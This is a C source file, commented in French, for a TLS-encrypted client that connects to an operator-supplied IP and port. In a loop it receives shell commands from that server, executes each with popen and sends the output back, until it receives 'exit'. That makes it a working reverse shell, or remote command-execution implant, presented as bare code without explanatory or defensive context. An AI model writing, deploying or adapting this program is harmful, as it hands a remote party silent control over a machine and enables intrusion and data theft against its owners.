#include <openssl/ssl.h>
#include <openssl/err.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

void init_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

SSL_CTX *create_context() {
    const SSL_METHOD *method = TLS_client_method();
    SSL_CTX *ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    // Renforcer la sécurité
    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3);
    SSL_CTX_set_cipher_list(ctx, "HIGH:!aNULL:!MD5");

    return ctx;
}

void configure_context(SSL_CTX *ctx) {
    // Charge le CA pour valider le certificat du serveur
    if (!SSL_CTX_load_verify_locations(ctx, "cert/ca.crt", NULL)) {
        fprintf(stderr, "Impossible de charger le certificat CA.\n");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
    SSL_CTX_set_verify_depth(ctx, 1);
}

int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Usage: %s <server_ip> <port>\n", argv[0]);
        exit(1);
    }

    init_openssl();
    SSL_CTX *ctx = create_context();
    configure_context(ctx);

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(argv[2]));
    addr.sin_addr.s_addr = inet_addr(argv[1]);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        perror("Connection failed");
        exit(1);
    }

    SSL *ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    } else {
        X509 *cert = SSL_get_peer_certificate(ssl);
        if (cert) {
            long verify_result = SSL_get_verify_result(ssl);
            if (verify_result != X509_V_OK) {
                fprintf(stderr, "Certificat serveur invalide : %s\n", X509_verify_cert_error_string(verify_result));
                X509_free(cert);
                exit(1);
            }
            X509_free(cert);
        }

        while (1) {
            char command[1024] = {0};
            int read_bytes = SSL_read(ssl, command, sizeof(command) - 1);
            if (read_bytes <= 0) break;

            command[read_bytes] = '\0';
            if (strcmp(command, "exit") == 0) break;

            FILE *fp = popen(command, "r");
            if (!fp) {
                perror("popen failed");
                exit(1);
            }

            char output[4096];
            while (fgets(output, sizeof(output), fp) != NULL)
                SSL_write(ssl, output, strlen(output));

            pclose(fp);
            SSL_write(ssl, "<END>", strlen("<END>"));
        }
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sock);
    SSL_CTX_free(ctx);
    EVP_cleanup();
    return 0;
}
